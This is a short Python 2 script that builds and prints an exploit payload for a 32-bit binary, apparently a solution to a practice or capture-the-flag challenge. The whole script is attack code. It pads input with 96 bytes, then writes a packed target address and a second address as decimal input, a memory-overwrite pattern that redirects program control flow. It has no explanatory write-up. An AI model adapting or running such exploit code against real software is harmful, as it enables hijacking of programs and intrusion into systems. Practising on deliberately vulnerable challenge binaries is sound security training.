import struct

def bytes_string (num):
	
	num_bytes = struct.pack ('<I', num)
	output_string = ''
	for i in num_bytes:
		if (len (hex(ord(i))[2:]) < 2):
			curr_byte = r'\x' + '0' + hex(ord(i))[2:]
		else:
			curr_byte = r'\x' + hex(ord(i))[2:]

		output_string += curr_byte
		
	return output_string

def main():
	
	payload = ''

	pass1 = struct.pack ("<I", 0x804A004)
	pass1_ = bytes_string (134520836)
	pass1__ = "\x04\xA0\x04\x08"
	
	padding = 'A' * 96
	payload += padding
	payload += pass1
	payload += '\n'

	payload += str (134514147) + '\n'
	payload += str (2) + '\n'

	# payload += '\n' # the program needs to know enter was pressed

	# print (pass1)
	# print (pass1_)
	# print (len(payload))
	print (payload)
	
	return

if __name__ == '__main__':
	main()